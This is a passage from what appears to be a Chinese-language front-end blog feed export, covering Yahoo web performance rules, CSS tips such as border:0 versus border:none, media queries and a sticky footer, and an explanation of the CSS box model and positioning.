?&gt;…为了证明使用这项技术的好处，Yahoo!搜索率先研究并完成了用户测试。16、使用GET来完成AJAX请求Yahoo!Mail团队发现，当使用XMLHttpRequest时，浏览器中的POST方法是一个“两步走”的过程：首先发送文件头，然后才发送数 据。因此使用GET最为恰当，因为它只需发送一个TCP包（除非你有很多cookie）。IE中URL的最大长度为2K，因此如果你要发送一个超过2K的 数据时就不能使用GET了。一个有趣的不同就是POST并不像GET那样实际发送数据。根据HTTP规范，GET意味着“获取”数据，因此当你仅仅获取数据时使用GET更加有意义 （从语意上讲也是如此），相反，发送并在服务端保存数据时使用POST。除此之外，JavaScript和CSS也是我们页面中经常用到的内容，对它们的优化也提高网站性能的重要方面：35、避免空的图像来源一个src属性为空串的图像有两种情况：1． 直接的HTML2． JavaScriptvar img = new Image();img.src = “”;这两种情况都会引起同样的效果：浏览器会再次向你的服务器发出请求。Internet Explorer 将向这个页面所在的目录发出一个请求Safari and Chrome 将发出对这个页面的一个请求。Firefox 3 和更早的版本所采取的动作和Safari and Chrome一样，但是 3.5版本 addressed this issue[bug 444931]and no longer sends a request.Opera 不进行任何操作。这个行为为何是不好的？1、 发送大量突然的请求将使你的服务器宕机（Cripple your servers），尤其是每天有数百万访问量的页面。2、 产生一个从未浏览过的页面将浪费服务器的计算周期（computing cycles）3、 损坏用户数据。如果你在请求中追踪状态（以cookie或是其他的方式），你可能会损坏数据。即使这个图像请求并没有返回一个图像，所有的头被浏览器读取并接受，包括所有cookie。While the rest of the response is thrown away, the damage may already be done.引起这种行为的根源在于浏览器中URI的解析方式。这种行为定义在RFC 3986 - Uniform Resource Identifiers.当一个空串作为一个URI时，它被认为一个相对URI（relative URI）并通过定义在section 5.2中的算法被解析。这个特例，一个空串，列在section 5.4当中。Firefox, Safari, and Chrome都是依据这一规格来解析空串，而Internet Explorer则不正确的解析这个串，符合更早的一个规范，RFC 2396 - Uniform Resource Identifiers (this was obsoleted by RFC 3986).所以技术上，浏览器都在做它们被期望所做的事情来解析relative URIs，问题是在这个范围，空串不是故意造成的。HTML5 adds to the description of the file:///C:/Users/Prayer/AppData/Local/Temp/msohtmlclip1/01/clip_image001.giftag’s src attribute to instruct browsers not to make an additional request in section 4.8.2:The src attribute must be present, and must contain a valid URL referencing a non-interactive, optionally animated, image resource that is neither paged nor scripted. If the base URI of the element is the same as the document’s address, then the src attribute’s value must not be the empty string.非常希望浏览器在将来不会有这样的问题。不幸的是，没有为and 的条款。或许仍需要时间来做出调整以保证浏览器不会意外的实现这一行为。 这一规则是受雅虎JavaScript导师Nicolas C. Zakas启发。更新信息请参见Empty image src can destroy your site.. 三、CSS部分 把样式表置于顶部 避免使用CSS表达式（Expression） 用代替@import 避免使用滤镜17、把样式表置于顶部在研究Yahoo!的性能表现时，我们发现把样式表放到文档的内部似乎会加快页面的下载速度。这是因为把样式表放到内会使页面有步骤的加载显示。注重性能的前端服务器往往希望页面有秩序地加载。同时，我们也希望浏览器把已经接收到内容尽可能显示出来。这对于拥有较多内容的页面和网速较慢的用户来说 特别重要。向用户返回可视化的反馈，比如进程指针，已经有了较好的研究并形成了正式文档。在我们的研究中HTML页面就是进程指针。当浏览器有序地加载文 件头、导航栏、顶部的logo等对于等待页面加载的用户来说都可以作为可视化的反馈。这从整体上改善了用户体验。把样式表放在文档底部的问题是在包括Internet Explorer在内的很多浏览器中这会中止内容的有序呈现。浏览器中止呈现是为了避免样式改变引起的页面元素重绘。用户不得不面对一个空白页面。HTML规范清楚指出样式表要放包含在页面的区域内：“和不同，只能出现在文档的区域内，尽管它可以多次使用它”。无论是引起白屏还是出现没有样式化的内容都不值得去尝试。最好的方案就是按照HTML规范在文 档内加载你的样式表。 18、避免使用CSS表达式（Expression） CSS表达式是动态设置CSS属性的强大（但危险）方法。Internet Explorer从第5个版本开始支持CSS表达式。下面的例子中，使用CSS表达式可以实现隔一个小时切换一次背景颜色：background-color: expression( (new Date()).getHours()%2 ? “#B8D4FF” : “#F08A00” );如上所示，expression中使用了JavaScript表达式。CSS属性根据JavaScript表达式的计算结果来设置。expression 方法在其它浏览器中不起作用，因此在跨浏览器的设计中单独针对Internet Explorer设置时会比较有用。表达式的问题就在于它的计算频率要比我们想象的多。不仅仅是在页面显示和缩放时，就是在页面滚动、乃至移动鼠标时都会要重新计算一次。给CSS表达式增加 一个计数器可以跟踪表达式的计算频率。在页面中随便移动鼠标都可以轻松达到10000次以上的计算量。一个减少CSS表达式计算次数的方法就是使用一次性的表达式，它在第一次运行时将结果赋给指定的样式属性，并用这个属性来代替CSS表达式。如果样式属性 必须在页面周期内动态地改变，使用事件句柄来代替CSS表达式是一个可行办法。如果必须使用CSS表达式，一定要记住它们要计算成千上万次并且可能会对你 页面的性能产生影响。 19、用代替@import前面的最佳实现中提到CSS应该放置在顶端以利于有序加载呈现。在IE中，页面底部@import和使用作用是一样的，因此最好不要使用它。 20、避免使用滤镜IE独有属性AlphaImageLoader用于修正7.0以下版本中显示PNG图片的半透明效果。这个滤镜的问题在于浏览器加载图片时它会终止内容的 呈现并且冻结浏览器。在每一个元素（不仅仅是图片）它都会运算一次，增加了内存开支，因此它的问题是多方面的。完全避免使用AlphaImageLoader的最好方法就是使用PNG8格式来代替，这种格式能在IE中很好地工作。如果你确实需要使用 AlphaImageLoader，请使用下划线_filter又使之对IE7以上版本的用户无效。 四、 JavaScript部分 把脚本置于页面底部 使用外部JavaScript和CSS 削减JavaScript和CSS 剔除重复脚本 减少DOM访问 开发智能事件处理程序21、把脚本置于页面底部脚本带来的问题就是它阻止了页面的平行下载。HTTP/1.1 规范建议，浏览器每个主机名的并行下载内容不超过两个。如果你的图片放在多个主机名上，你可以在每个并行下载中同时下载2个以上的文件。但是当下载脚本 时，浏览器就不会同时下载其它文件了，即便是主机名不相同。在某些情况下把脚本移到页面底部可能不太容易。比如说，如果脚本中使用了document.write来插入页面内容，它就不能被往下移动了。这里可能还 会有作用域的问题。很多情况下，都会遇到这方面的问题。一个经常用到的替代方法就是使用延迟脚本。DEFER属性表明脚本中没有包含document.write，它告诉浏览器继续显示。不幸的 是，Firefox并不支持DEFER属性。在Internet Explorer中，脚本可能会被延迟但效果也不会像我们所期望的那样。如果脚本可以被延迟，那么它就可以移到页面的底部。这会让你的页面加载的快一点。 22、使用外部JavaScript和CSS 很多性能规则都是关于如何处理外部文件的。但是，在你采取这些措施前你可能会问到一个更基本的问题：JavaScript和CSS是应该放在外部文件中呢 还是把它们放在页面本身之内呢？在实际应用中使用外部文件可以提高页面速度，因为JavaScript和CSS文件都能在浏览器中产生缓存。内置在HTML文档中的JavaScript 和CSS则会在每次请求中随HTML文档重新下载。这虽然减少了HTTP请求的次数，却增加了HTML文档的大小。从另一方面来说，如果外部文件中的 JavaScript和CSS被浏览器缓存，在没有增加HTTP请求次数的同时可以减少HTML文档的大小。关键问题是，外部JavaScript和CSS文件缓存的频率和请求HTML文档的次数有关。虽然有一定的难度，但是仍然有一些指标可以一测量它。如果一 个会话中用户会浏览你网站中的多个页面，并且这些页面中会重复使用相同的脚本和样式表，缓存外部文件就会带来更大的益处。许多网站没有功能建立这些指标。对于这些网站来说，最好的坚决方法就是把JavaScript和CSS作为外部文件引用。比较适合使用内置代码的例外就是 网站的主页，如Yahoo!主页和My Yahoo!。主页在一次会话中拥有较少（可能只有一次）的浏览量，你可以发现内置JavaScript和CSS对于终端用户来说会加快响应时 间。对于拥有较大浏览量的首页来说，有一种技术可以平衡内置代码带来的HTTP请求减少与通过使用外部文件进行缓存带来的好处。其中一个就是在首页中内置 JavaScript和CSS，但是在页面下载完成后动态下载外部文件，在子页面中使用到这些文件时，它们已经缓存到浏览器了。 23、削减JavaScript和CSS 精简是指从去除代码不必要的字符减少文件大小从而节省下载时间。消减代码时，所有的注释、不需要的空白字符（空格、换行、tab缩进）等都要去掉。在 JavaScript中，由于需要下载的文件体积变小了从而节省了响应时间。精简JavaScript中目前用到的最广泛的两个工具是JSMin和YUI Compressor。YUI Compressor还可用于精简CSS。混淆是另外一种可用于源代码优化的方法。这种方法要比精简复杂一些并且在混淆的过程更易产生问题。在对美国前10大网站的调查中发现，精简也可以缩小原来 代码体积的21%，而混淆可以达到25%。尽管混淆法可以更好地缩减代码，但是对于JavaScript来说精简的风险更小。除消减外部的脚本和样式表文件外，和代码块也可以并且应该进行消减。即使你用Gzip压缩过脚本 和样式表，精简这些文件仍然可以节省5%以上的空间。由于JavaScript和CSS的功能和体积的增加，消减代码将会获得益处。 24、剔除重复脚本在同一个页面中重复引用JavaScript文件会影响页面的性能。你可能会认为这种情况并不多见。对于美国前10大网站的调查显示其中有两家存在重复引 用脚本的情况。有两种主要因素导致一个脚本被重复引用的奇怪现象发生：团队规模和脚本数量。如果真的存在这种情况，重复脚本会引起不必要的HTTP请求和 无用的JavaScript运算，这降低了网站性能。在Internet Explorer中会产生不必要的HTTP请求，而在Firefox却不会。在Internet Explorer中，如果一个脚本被引用两次而且它又不可缓存，它就会在页面加载过程中产生两次HTTP请求。即时脚本可以缓存，当用户重载页面时也会产 生额外的HTTP请求。除增加额外的HTTP请求外，多次运算脚本也会浪费时间。在Internet Explorer和Firefox中不管脚本是否可缓存，它们都存在重复运算JavaScript的问题。一个避免偶尔发生的两次引用同一脚本的方法是在模板中使用脚本管理模块引用脚本。在HTML页面中使用标签引用脚本的最常见方法就是： 在PHP中可以通过创建名为insertScript的方法来替代：&lt;?php insertScript(“menu.js”) ?&gt;为了防止多次重复引用脚本，这个方法中还应该使用其它机制来处理脚本，如检查所属目录和为脚本文件名中增加版本号以用于Expire文件头等。25、减少DOM访问使用JavaScript访问DOM元素比较慢，因此为了获得更多的应该页面，应该做到：缓存已经访问过的有关元素线下更新完节点之后再将它们添加到文档树中避免使用JavaScript来修改页面布局有关此方面的更多信息请查看Julien Lecomte在YUI专题中的文章“高性能Ajax应该程序”。26、开发智能事件处理程序有时候我们会感觉到页面反应迟钝，这是因为DOM树元素中附加了过多的事件句柄并且些事件句病被频繁地触发。这就是为什么说使用event delegation（事件代理）是一种好方法了。如果你在一个div中有10个按钮，你只需要在div上附加一次事件句柄就可以了，而不用去为每一个按 钮增加一个句柄。事件冒泡时你可以捕捉到事件并判断出是哪个事件发出的。你同样也不用为了操作DOM树而等待onload事件的发生。你需要做的就是等待树结构中你要访问的元素出现。你也不用等待所有图像都加载完毕。你可能会希望用DOMContentLoaded事件来代替 事件应用程序中的onAvailable方法。有关此方面的更多信息请查看Julien Lecomte在YUI专题中的文章“高性能Ajax应该程序”。图片和Coockie也是我们网站中几乎不可缺少组成部分，此外随着移动设备的流行，对于移动应用的优化也十分重要。这主要包括：五、Coockie部分减小Cookie体积对于页面内容使用无coockie域名27、减小Cookie体积HTTP coockie可以用于权限验证和个性化身份等多种用途。coockie内的有关信息是通过HTTP文件头来在web服务器和浏览器之间进行交流的。因此 保持coockie尽可能的小以减少用户的响应时间十分重要。有关更多信息可以查看Tenni Theurer和Patty Chi的文章“When the Cookie Crumbles”。这们研究中主要包括：去除不必要的coockie使coockie体积尽量小以减少对用户响应的影响注意在适应级别的域名上设置coockie以便使子域名不受影响设置合理的过期时间。较早地Expire时间和不要过早去清除coockie，都会改善用户的响应时间。28、对于页面内容使用无coockie域名当浏览器在请求中同时请求一张静态的图片和发送coockie时，服务器对于这些coockie不会做任何地使用。因此他们只是因为某些负面因素而创建的 网络传输。所有你应该确定对于静态内容的请求是无coockie的请求。创建一个子域名并用他来存放所有静态内容。如果你的域名是http://www.example.org/ ，你可以在static.example.org上存在静态内容。但是，如果你不是在http://www.example.org/ 上而是在顶级域名example.org设置了coockie，那么所有对于static.example.org的请求都包含coockie。在这种情 况下，你可以再重新购买一个新的域名来存在静态内容，并且要保持这个域名是无coockie的。Yahoo!使用的是ymig.com，YouTube使 用的是ytimg.com，Amazon使用的是images-anazon.com等等。使用无coockie域名存在静态内容的另外一个好处就是一些代理（服务器）可能会拒绝对coockie的内容请求进行缓存。一个相关的建议就是，如果你 想确定应该使用example.org还是http://www.example.org/ 作为你的一主页，你要考虑到coockie带来的影响。忽略掉www会使你除了把coockie设置到.example.org（是泛域名解析，代表 了所有子域名译者dudo注）外没有其它选择，因此出于性能方面的考虑最好是使用带有www的子域名并且在它上面设置coockie。六、Image 部分优化图像优化CSS Spirite不要在HTML中缩放图像favicon.ico要小而且可缓存29、优化图像设计人员完成对页面的设计之后，不要急于将它们上传到web服务器，这里还需要做几件事：你可以检查一下你的GIF图片中图像颜色的数量是否和调色板规格一致。 使用imagemagick中下面的命令行很容易检查：identify -verbose image.gif如果你发现图片中只用到了4种颜色，而在调色板的中显示的256色的颜色槽，那么这张图片就还有压缩的空间。尝试把GIF格式转换成PNG格式，看看是否节省空间。大多数情况下是可以压缩的。由于浏览器支持有限，设计者们往往不太乐意使用PNG格式的图片，不过 这都是过去的事情了。现在只有一个问题就是在真彩PNG格式中的alpha通道半透明问题，不过同样的，GIF也不是真彩格式也不支持半透明。因此GIF 能做到的，PNG（PNG8）同样也能做到（除了动画）。下面这条简单的命令可以 安全地把GIF格式转换为PNG格式：convert image.gif image.png“我们要说的是：给PNG一个施展身手的机会吧！”在所有的PNG图片上运行pngcrush（或者其它PNG优化工具）。例如：pngcrush image.png -rem alla -reduce -brute result.png在所有的JPEG图片上运行jpegtran。这个工具可以对图片中的出现的锯齿等做无损操作，同时它还可以用于优化和清除图片中的注释以及其它无用信息 （如EXIF信息）：jpegtran -copy none -optimize -perfect src.jpg dest.jpg30、优化CSS Spirite在Spirite中水平排列你的图片，垂直排列会稍稍增加文件大小；Spirite中把颜色较近的组合在一起可以降低颜色数，理想状况是低于256色以便适用PNG8格式；便于移动，不要在Spirite的图像中间留有较大空隙。这虽然不大会增加文件大小但对于用户代理来说它需要更少的内存来把图片解压为像素地图。 100x100的图片为1万像素，而1000x1000就是100万像素。31、不要在HTML中缩放图像不要为了在HTML中设置长宽而使用比实际需要大的图片。如果你需要：那么你的图片（mycat.jpg）就应该是100x100像素而不是把一个500x500像素的图片缩小使用。32、favicon.ico要小而且可缓存favicon.ico是位于服务器根目录下的一个图片文件。它是必定存在的，因为即使你不关心它是否有用，浏览器也会对它发出请求，因此最好不要返回一 个404 Not Found的响应。由于是在同一台服务器上，它每被请求一次coockie就会被发送一次。这个图片文件还会影响下载顺序，例如在IE中当你在 onload中请求额外的文件时，favicon会在这些额外内容被加载前下载。因此，为了减少favicon.ico带来的弊端，要做到：文件尽量地小，最好小于1K在适当的时候（也就是你不要打算再换favicon.ico的时候，因为更换新文件时不能对它进行重命名）为它设置Expires文件头。你可以很安全地 把Expires文件头设置为未来的几个月。你可以通过核对当前favicon.ico的上次编辑时间来作出判断。Imagemagick可以帮你创建小巧的favicon。七、 Mobile部分保持单个内容小于25K打包组件成复合文本33、保持单个内容小于25K这条限制主要是因为iPhone不能缓存大于25K的文件。注意这里指的是解压缩后的大小。由于单纯gizp压缩可能达不要求，因此精简文件就显得十分重 要。查看更多信息，请参阅Wayne Shea和Tenni Theurer的文件“Performance Research, Part 5: iPhone Cacheability - Making it Stick”。34、打包组件成复合文本把页面内容打包成复合文本就如同带有多附件的Email，它能够使你在一个HTTP请求中取得多个组件（切记：HTTP请求是很奢侈的）。当你使用这条规 则时，首先要确定用户代理是否支持（iPhone就不支持）。]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[border:none与border:0的深入分析比较]]></title>
    <url>%2F2015%2F07%2F12%2Fbordernone%E4%B8%8Eborder0%E7%9A%84%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90%E6%AF%94%E8%BE%83%2F</url>
    <content type="text"><![CDATA[如果你要用CSS去表达元素没有边框，你会怎么表达？是border:0呢？还是border:none呢？我听过很多人推荐使用border:none，因为其理由是客户端的渲染。乍听之下会觉得：嗯，有道理，又学到东西了呵……其实，很多时候，代码是死的，没有绝对的好与坏！在相对论面前，神马都是浮云……要想明白哪种写法最适合你当前的环境，那么就必须先了解这两种写法的含义及优缺点：一、border:0含义：它代表着边框:大小为0，在浏览器解析后的结果是没有边框优点1：在写的时候，少写三个字母，这代表在写代码时，这种写法的效率更高优点2：比另外一种写法少了三个字节，这代表它在体积上更节约了，减低了服务端的负担缺点：浏览器在解析它的时候，会认为是（边框：其它的默认渲染依然存在，比如solid？比如red？仅是大小为0）二、border:none含义：它代表着边框:没有，在浏览器解析后的结果，未必是所有元素都没有边框，试试input如何？优点1：浏览器在解析它的时候，会认为是（边框：什么也没有，不渲染任何样式），不同于border:0，它毕竟还是有渲染的，但border:none是彻底无视，所以当浏览器在看它border:none时，就选择了路过……！缺点：请参考border:0的优点那么读到了这里，你会不会这样理解？border:0是为了服务端而服务的，它算是减轻了服务器的压力border:none是为了客户端而服务的，它算是减轻了浏览器的压力那么，你现在决定了选择哪种写法我个人是无论大小网站，基本都选择border:0的因为就网站而言，我觉得服务器的压力大于浏览器，因为服务器只有一个，而浏览器，有N个……如果你的是大网站，你的服务器有多牛？千万别小看一句写法少了三个字节，千万别认为是”三个字节而已”反之，如果是小网站，你的代码要有多复杂，才会让浏览器负荷到造成你浏览产生困扰的地步？从而必须要选择border:none去优化？或许你不认同这种观点，那么我们换一种观点？用一些小学知识去理解怎么样？]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>border:0</tag>
        <tag>border:none</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS控制div宽度最大宽度/高度和最小宽度/高度]]></title>
    <url>%2F2015%2F07%2F12%2Fcss%E6%8E%A7%E5%88%B6div%E5%AE%BD%E5%BA%A6%E6%9C%80%E5%A4%A7%E5%AE%BD%E5%BA%A6%E9%AB%98%E5%BA%A6%E5%92%8C%E6%9C%80%E5%B0%8F%E5%AE%BD%E5%BA%A6%E9%AB%98%E5%BA%A6%2F</url>
    <content type="text"><![CDATA[12345678910111213141516171819202122232425262728293031/* 最小宽度 */.min_width&#123;min-width:300px;/* sets max-width for IE */_width:expression(document.body.clientWidth 600 ? "600px" : "auto");&#125;/* 最小高度 */.min_height&#123;min-height:200px;/* sets min-height for IE */_height:expression(this.scrollHeight 400 ? "400px" : "auto");&#125;/* 最大最小宽度 */.min_and_max_width&#123;min-width:300px;max-width:600px;/* sets min-width &amp;amp; max-width for IE */_width: expression(document.body.clientWidth 600 ? "600px" : "auto"));&#125;/* 最大最小高度 */.min_and_max_height&#123;min-height:200px;max-height:400px;/* sets min-height &amp;amp; max-height for IE */_height: expression(this.scrollHeight 400 ? "400px" : "auto"));最小宽度可以随意设置 要看到上级的最大宽度是多少]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[重置（修改）checkbox样式]]></title>
    <url>%2F2015%2F07%2F12%2F%E9%87%8D%E7%BD%AE%EF%BC%88%E4%BF%AE%E6%94%B9%EF%BC%89checkbox%E6%A0%B7%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[1234567891011121314151617181920212223242526272829303132&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;meta name="viewport" content="width=device-width,user-scalable=no, initial-scale=1"&gt;&lt;title &gt;123&lt;/title&gt;&lt;link rel="stylesheet" type="text/css" href="css.css" /&gt;&lt;style&gt;.li1&#123;display: none;&#125;.li1_lab&#123;width: 31px;height: 31px;border: 1px solid #ccc;display: block;-moz-box-shadow:0px 0px 2px #999 inset; /* For Firefox3.6+ */-webkit-box-shadow:0px 0px 2px #999 inset; /* For Chrome5+, Safari5+ */box-shadow:0px 0px 2px #999 inset;&#125;.li1:checked~.li1_lab&#123;background: url(checkbox.jpg); /* 选中后的图标 */-moz-box-shadow:0px 0px 2px green inset; /* For Firefox3.6+ */-webkit-box-shadow:0px 0px 2px green inset; /* For Chrome5+, Safari5+ */box-shadow:0px 0px 2px green inset;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;input type="checkbox" id="li1" class="li1" value="1" name="li1"&gt;&lt;label for="li1" class="li1_lab"&gt;&lt;/label&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>checkbox样式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[expires用于网页缓存过期时间]]></title>
    <url>%2F2015%2F07%2F12%2Fexpires%E7%94%A8%E4%BA%8E%E7%BD%91%E9%A1%B5%E7%BC%93%E5%AD%98%E8%BF%87%E6%9C%9F%E6%97%B6%E9%97%B4%2F</url>
    <content type="text"><![CDATA[expires用于网页缓存过期时间expires出现在http-equiv属性中，使用content属性表示页面缓存的过期时间expires用于设定网页的过期时间,一旦过期就必须从服务器上重新加载.时间必须使用GMT格式expires示例&lt;meta http-equiv=&quot;expires&quot; content=&quot;Sunday 26 October 2008 01:00 GMT&quot; /&gt;]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>expires</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[media对各种设备的判断]]></title>
    <url>%2F2015%2F07%2F12%2Fmedia%E5%AF%B9%E5%90%84%E7%A7%8D%E8%AE%BE%E5%A4%87%E7%9A%84%E5%88%A4%E6%96%AD%2F</url>
    <content type="text"><![CDATA[123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101@media only screen and (min-device-width : 320px) and (max-device-width : 480px) &#123;/* Smartphones (portrait and landscape) */&#125;@media only screen and (min-width : 321px) &#123;/* Smartphones (landscape) */&#125;@media only screen and (max-width : 320px) &#123;/* Smartphones (portrait) */&#125;@media only screen and (min-device-width : 768px) and (max-device-width : 1024px) &#123;/* iPads (portrait and landscape) */&#125;@media only screen and (min-device-width : 768px) and (max-device-width : 1024px) and (orientation : landscape) &#123;/* iPads (landscape) */&#125;@media only screen and (min-device-width : 768px) and (max-device-width : 1024px) and (orientation : portrait) &#123;/* iPads (portrait) */&#125;@media only screen and (-webkit-min-device-pixel-ratio : 1.5),only screen and (min-device-pixel-ratio : 1.5) &#123;/* iPhone 4 */&#125;@media screen and (max-width : 640px) &#123;/*640px */&#125;@media screen and (max-width : 800px) &#123;/* 800px */&#125;@media screen and (max-width : 1024px) &#123;/* 1024px */&#125;@media only screen and (min-width : 1224px) &#123;/* Desktops and laptops */&#125;@media only screen and (min-width : 1824px) &#123;/* Large screens */&#125;@media only screen and (min-width: 320px) &#123;/* Small screen, non-retina */&#125;@mediaonly screen and (-webkit-min-device-pixel-ratio: 2) and (min-width: 320px),only screen and ( min--moz-device-pixel-ratio: 2) and (min-width: 320px),only screen and ( -o-min-device-pixel-ratio: 2/1) and (min-width: 320px),only screen and ( min-device-pixel-ratio: 2) and (min-width: 320px),only screen and ( min-resolution: 192dpi) and (min-width: 320px),only screen and ( min-resolution: 2dppx) and (min-width: 320px) &#123;/* Small screen, retina, stuff to override above media query */&#125;@media only screen and (min-width: 700px) &#123;/* Medium screen, non-retina */&#125;@mediaonly screen and (-webkit-min-device-pixel-ratio: 2) and (min-width: 700px),only screen and ( min--moz-device-pixel-ratio: 2) and (min-width: 700px),only screen and ( -o-min-device-pixel-ratio: 2/1) and (min-width: 700px),only screen and ( min-device-pixel-ratio: 2) and (min-width: 700px),only screen and ( min-resolution: 192dpi) and (min-width: 700px),only screen and ( min-resolution: 2dppx) and (min-width: 700px) &#123;/* Medium screen, retina, stuff to override above media query */&#125;@media only screen and (min-width: 1300px) &#123;/* Large screen, non-retina */&#125;@mediaonly screen and (-webkit-min-device-pixel-ratio: 2) and (min-width: 1300px),only screen and ( min--moz-device-pixel-ratio: 2) and (min-width: 1300px),only screen and ( -o-min-device-pixel-ratio: 2/1) and (min-width: 1300px),only screen and ( min-device-pixel-ratio: 2) and (min-width: 1300px),only screen and ( min-resolution: 192dpi) and (min-width: 1300px),only screen and ( min-resolution: 2dppx) and (min-width: 1300px) &#123;/* Large screen, retina, stuff to override above media query */&#125;当然更好的方法是分离css文件,更易于维护12&lt;link rel="stylesheet" media="screen and (min-device-width : 320px) and (max-device-width: 480px)" href="iphone.css" /&gt;&lt;link rel="stylesheet" media="screen and (min-device-width : 768px) and (max-device-width : 1024px)" href="ipad.css" /&gt;最后不要忘了加上viewport1&lt;meta name="viewport" content="width=device-width, initial-scale=1.0" /&gt;]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>media</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[不足一屏时，页面底部位于浏览器底部（用CSS解决）]]></title>
    <url>%2F2015%2F07%2F12%2F%E4%B8%8D%E8%B6%B3%E4%B8%80%E5%B1%8F%E6%97%B6%EF%BC%8C%E9%A1%B5%E9%9D%A2%E5%BA%95%E9%83%A8%E4%BD%8D%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E5%BA%95%E9%83%A8%EF%BC%88%E7%94%A8css%E8%A7%A3%E5%86%B3%2F</url>
    <content type="text"><![CDATA[写一些系统后台的页面时，时长用需要做到 “不足一屏时，页面底部位于浏览器底部”；在网上看了很多办法，有些兼容性不好，有些需要用到JS ，最后找到这个办法纯CSS的觉得非常不错，随后自己完善了下。将代码贴出来与大家一起探讨！12345678910111213141516171819202122232425262728&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;title&gt;不足一屏时，页面底部位于浏览器底部&lt;/title&gt;&lt;style type="text/css"&gt;*&#123;margin:0; padding:0;&#125;html,body&#123;height:100%;&#125;.wrap&#123;position:relative;min-height:100%;&#125;.header&#123;height:50px;background-color:#6CF;&#125;.content&#123;padding-bottom:50px;/*height:2000px; 做超过一屏时使用*/&#125;.footer&#123;position:absolute;bottom:0;left:0;width:100%;/*绝对定位使后宽度100%*/height:50px;background-color:green;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="wrap"&gt;&lt;div class="header"&gt;header&lt;/div&gt;&lt;div class="content"&gt;&lt;/div&gt;&lt;div class="footer"&gt;footer&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[CSS最核心的概念解析]]></title>
    <url>%2F2015%2F07%2F12%2Fcss%E6%9C%80%E6%A0%B8%E5%BF%83%E7%9A%84%E6%A6%82%E5%BF%B5%E8%A7%A3%E6%9E%90%2F</url>
    <content type="text"><![CDATA[本文将讲述 CSS 中最核心的几个概念，包括：盒模型、position、float等。这些是CSS的基础，也是最常用的几个属性，它们之间看似独立却又相辅相成。为了掌握它们，有必要写出来探讨一下，如有错误欢迎指正。元素类型HTML 的元素可以分为两种：块级元素（block level element）内联元素（inline element 有的人也叫它行内元素）两者的区别在于以下三点：块级元素会独占一行（即无法与其他元素显示在同一行内，除非你显示修改元素的 display 属性），而内联元素则都会在一行内显示。块级元素可以设置 width、height 属性，而内联元素设置无效。块级元素的 width 默认为 100%，而内联元素则是根据其自身的内容或子元素来决定其宽度。最常见块级元素应该是吧，内联元素有 等等，完整的元素列表可以谷歌一下。_具体来说一下吧,.example{width: 100px;height: 100px;}我们为设置上面的样式，是有效果的，因为其是块级元素，而对 设置上面的样式是没用的。要想让也可以改变宽高，可以通过设置 display: block; 来达到效果。当 display 的值设为 block 时，元素将以块级形式呈现；当 display 值设为 inline 时，元素将以内联形式呈现。若既想让元素在行内显示，又能设置宽高，可以设置：display: inline-block;inline-block 在我看来就是让元素对外呈内联元素，可以和其他元素共处与一行内；对内则让元素呈块级元素，可改变其宽高。HTML 代码是顺序执行的，一份无任何 CSS 样式的 HTML 代码最终呈现出的页面是根据元素出现的顺序和类型排列的。块级元素就从上到下排列，遇到内联元素则从左到右排列。这种无样式的情况下，元素的分布叫普通流，元素出现的位置应该叫正常位置（这是我瞎起的），同时所有元素会在页面上占据一个空间，空间大小由其盒模型决定。盒模型页面上显示的每个元素（包括内联元素）都可以看作一个盒子，即盒模型( box model )。请看Chrome DevTools 里的截图：可以显而易见的看出盒模型由 4 部分组成。从内到外分别是： content -&gt; padding -&gt; border -&gt; margin按理来说一个元素的宽度（高度以此类推）应该这样计算：==总宽度 = margin-left + border-left + padding-left + width + padding-right + border-right + margin-right==但是不同浏览器（你没有猜错，就是那个与众不同的浏览器）对宽度的诠释不一样。符合 W3C 标准的浏览器认为一个元素的宽度只等于其 content 的宽度，其余都要额外算。于是你规定一个元素：.example {width: 200px;padding: 10px;border: 5px solid #000;margin: 20px;}则他最终的宽度应为：==宽度 = width(200px) + padding(10px 2) + border(5px 2) + margin(20px * 2) = 270px;==而在 IE（低于IE9） 下，最终宽度为：==宽度 = width(200px) + margin(20px * 2) = 240px;==我个人觉得 IE 的更符合人类思维，毕竟 padding 叫内边距，边框算作额外的宽度也说不下去。W3C 最后为了解决这个问题，在 CSS3 中加了 box-sizing 这个属性。当我们设置 box-sizing: border-box; 时，border 和 padding 就被包含在了宽高之内，和 IE 之前的标准是一样的。所以，为了避免你同一份 css 在不同浏览器下表现不同，最好加上：, :before, *:after { -moz-box-sizing: border-box; -webkit-box-sizing: border-box; box-sizing: border-box;}这里还有两种特殊情况：无宽度 —— 绝对定位（position: absolute;） 元素无宽度 —— 浮动（float）元素它们在页面上的表现均不占据空间（脱离普通流，感觉像浮在页面上层一样，移动它们不影响其他元素的定位）。这就涉及到另外两个核心概念 position 和 float。positionposition 这个属性决定了元素将如何定位。它的值大概有以下五种：staticposition的默认值。元素将定位到它的正常位置（上文提到过），其实也就相当于没有定位。元素在页面上位置不能使用 top right bottom left 移动元素位置。relative相对定位，相对于元素的正常位置来进行定位。元素在页面占据位置。可以使用 top right bottom left 移动元素位置。absolute绝对定位，相对于最近一级的 定位不是 static 